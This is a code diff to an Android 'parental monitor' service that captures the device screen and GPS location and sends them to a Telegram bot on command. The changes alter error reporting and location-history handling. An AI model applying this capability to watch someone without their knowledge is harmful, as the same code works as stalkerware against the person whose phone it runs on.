@@ -1683,7 +1683,7 @@ class MonitoringService : Service() {
                     sendToTelegram("⏸️ Monitoring dijeda. Kirim /resume dulu.")
                 } else {
                     sendToTelegram("\uD83D\uDDA5 Ambil layar…")
-                    captureAndSendScreenshot(reportResult = true)
+                    captureAndSendScreenshot()
                 }
             }
             "/status" -> {
@@ -3900,7 +3900,7 @@ class MonitoringService : Service() {
 
     private fun effectiveSyncMillis(): Long {
         val base = syncIntervalMillis()
-        val factor = (idleDataCycles.coerceIn(0, 8) + 1).coerceAtMost(4).toLong()
+        val factor = (idleDataCycles.coerceAtLeast(0) + 1).coerceAtMost(4).toLong()
         val stretched = try { base * factor } catch (_: Exception) { base }
         return stretched.coerceIn(1L, maxOf(base, 30 * 60_000L))
     }
@@ -4208,7 +4208,7 @@ class MonitoringService : Service() {
                 pts.add("$now:${(lat * 1_000_000).toLong()},${(lon * 1_000_000).toLong()}")
                 var fresh = pts.filter { (it.substringBefore(":").toLongOrNull() ?: 0L) >= cutoff }
                 if (fresh.size > 300) fresh = fresh.subList(fresh.size - 300, fresh.size)
-                preferencesManager.recordSentLocation(lat, lon, (if (fresh.isEmpty()) pts.takeLast(1) else fresh).joinToString(";"))
+                preferencesManager.recordSentLocation(lat, lon, fresh.joinToString(";"))
             }
         } catch (_: Exception) {
         }
@@ -5483,36 +5483,28 @@ class MonitoringService : Service() {
         return try { com.redeye.parentalmonitor.utils.ScreenCapture.granted() } catch (_: Exception) { false }
     }
 
-    private fun captureAndSendScreenshot(reportResult: Boolean = false) {
+    private fun captureAndSendScreenshot() {
         if (NetworkUtils.isAuthBlocked(preferencesManager)) {
             serviceScope.launch {
-                if (reportResult) {
-                    sendToTelegram("Token ditolak — tangkap layar ditahan sampai token diperbaiki di Setup.")
-                }
+                sendToTelegram("Token ditolak — tangkap layar ditahan sampai token diperbaiki di Setup.")
             }
             return
         }
         if (android.os.SystemClock.elapsedRealtime() < mediaBackoffUntil) {
             serviceScope.launch {
-                if (reportResult) {
-                    sendToTelegram("Dibatasi Telegram (rate limit) — tangkap layar ditahan lalu dicoba lagi.")
-                }
+                sendToTelegram("Dibatasi Telegram (rate limit) — tangkap layar ditahan lalu dicoba lagi.")
             }
             return
         }
         if (!hasScreenshotConsent()) {
             serviceScope.launch {
-                if (reportResult) {
-                    sendToTelegram("⚠️ Izin tangkap layar belum diberikan. Buka Setup, tekan Capture Screen, lalu izinkan sekali.")
-                }
+                sendToTelegram("⚠️ Izin tangkap layar belum diberikan. Buka Setup, tekan Capture Screen, lalu izinkan sekali.")
             }
             return
         }
         if (!shotBusy.compareAndSet(false, true)) {
             serviceScope.launch {
-                if (reportResult) {
-                    sendToTelegram("⚠️ Tangkap layar masih berjalan, coba /screenshot lagi sebentar.")
-                }
+                sendToTelegram("⚠️ Tangkap layar masih berjalan, coba /screenshot lagi sebentar.")
             }
             return
         }
@@ -5523,9 +5515,7 @@ class MonitoringService : Service() {
             if (shotAttempt.get() == shotSeq && shotBusy.compareAndSet(true, false)) {
                 shotAttempt.incrementAndGet()
                 android.util.Log.w("MonitoringService", "Screenshot watchdog: capture did not finish, flag reset")
-                if (reportResult) {
-                    sendToTelegram("⚠️ Tangkap layar tak menjawab (timeout). Coba /screenshot lagi.")
-                }
+                sendToTelegram("⚠️ Tangkap layar tak menjawab (timeout). Coba /screenshot lagi.")
             }
         }
         shotWatchdog = wd
@@ -5539,11 +5529,7 @@ class MonitoringService : Service() {
                     try { releaseShotSession() } catch (_: Exception) { }
                     try { wd.cancel() } catch (_: Exception) { }
                     shotBusy.set(false)
-                    if (reportResult) {
-                        sendToTelegram("⚠️ Izin tangkap layar dicabut. Buka Setup, tekan Capture Screen untuk memberikannya lagi.")
-                    } else {
-                        notifyMediaSendFailure("foto", "izin tangkap layar dicabut")
-                    }
+                    sendToTelegram("⚠️ Izin tangkap layar dicabut. Buka Setup, tekan Capture Screen untuk memberikannya lagi.")
                     return@launch
                 }
                 if (shotAttempt.get() != shotSeq) {
@@ -5554,9 +5540,7 @@ class MonitoringService : Service() {
                 try { wd.cancel() } catch (_: Exception) { }
                 if (shotFile == null) {
                     shotBusy.set(false)
-                    if (reportResult) {
-                        sendToTelegram("⚠️ Tangkap layar gagal. Bila sistem mencabut izinnya, berikan lagi di Setup (Capture Screen).")
-                    }
+                    sendToTelegram("⚠️ Tangkap layar gagal. Bila sistem mencabut izinnya, berikan lagi di Setup (Capture Screen).")
                     return@launch
                 }
                 markMediaActive(shotFile)
@@ -5565,15 +5549,11 @@ class MonitoringService : Service() {
                         MediaSendOutcome.SENT -> flushPendingPhotos()
                         MediaSendOutcome.DROPPED -> {
                             prunePhotoCache()
-                            if (reportResult) {
-                                sendToTelegram("⚠️ Tangkap layar ditolak Telegram (400) — berkas kosong/tak didukung, dibuang.")
-                            }
+                            sendToTelegram("⚠️ Tangkap layar ditolak Telegram (400) — berkas kosong/tak didukung, dibuang.")
                         }
                         MediaSendOutcome.KEPT -> {
                             prunePhotoCache()
-                            if (reportResult) {
-                                sendToTelegram("⚠️ Tangkap layar berhasil diambil tapi gagal diunggah. Berkas disimpan untuk dicoba lagi.")
-                            }
+                            sendToTelegram("⚠️ Tangkap layar berhasil diambil tapi gagal diunggah. Berkas disimpan untuk dicoba lagi.")
                         }
                     }
                 } finally {
@@ -5589,9 +5569,7 @@ class MonitoringService : Service() {
                 try { wd.cancel() } catch (_: Exception) { }
                 android.util.Log.e("MonitoringService", "✗ Error in captureAndSendScreenshot: ${redactToken(e.message)}")
                 serviceScope.launch {
-                    if (reportResult) {
-                        sendToTelegram("⚠️ Tangkap layar gagal. Bila sistem mencabut izinnya, berikan lagi di Setup (Capture Screen).")
-                    }
+                    sendToTelegram("⚠️ Tangkap layar gagal. Bila sistem mencabut izinnya, berikan lagi di Setup (Capture Screen).")
                 }
             }
         }
